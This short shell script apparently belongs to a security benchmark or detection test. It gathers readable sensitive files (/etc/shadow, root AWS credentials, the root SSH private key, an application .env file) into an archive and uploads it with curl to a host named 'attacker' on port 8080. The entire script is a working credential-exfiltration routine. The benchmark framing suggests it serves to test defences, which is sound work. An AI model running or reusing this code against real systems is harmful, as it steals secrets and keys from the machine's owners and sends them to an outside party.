#!/bin/sh
set -u
marker="${BENCH_MARKER:-manual}"
attacker="${BENCH_ATTACKER:-attacker}"
work="/tmp/bench-$marker"

archive="/tmp/bench-exfil-$marker.tar.gz"
response="$work/upload.response"

sh "$(dirname "$0")/cleanup.sh"
mkdir -p "$work" || exit 1

sensitive_files=""
for candidate in /etc/passwd /etc/shadow /root/.aws/credentials /root/.ssh/id_rsa /opt/app/.env; do
    [ -r "$candidate" ] && sensitive_files="$sensitive_files $candidate"
done
[ -n "$sensitive_files" ] || exit 1

echo "BENCH_ACTION $(date +%s.%N)"
tar -czf "$archive" $sensitive_files 2>/dev/null
[ -s "$archive" ] || exit 1

curl -fsS --max-time 15 -X POST \
    -H "Content-Type: application/gzip" \
    -H "X-Bench-Marker: $marker" \
    --data-binary "@$archive" \
    -o "$response" \
    "http://$attacker:8080/upload?marker=$marker" || exit 1
cat "$response"
echo
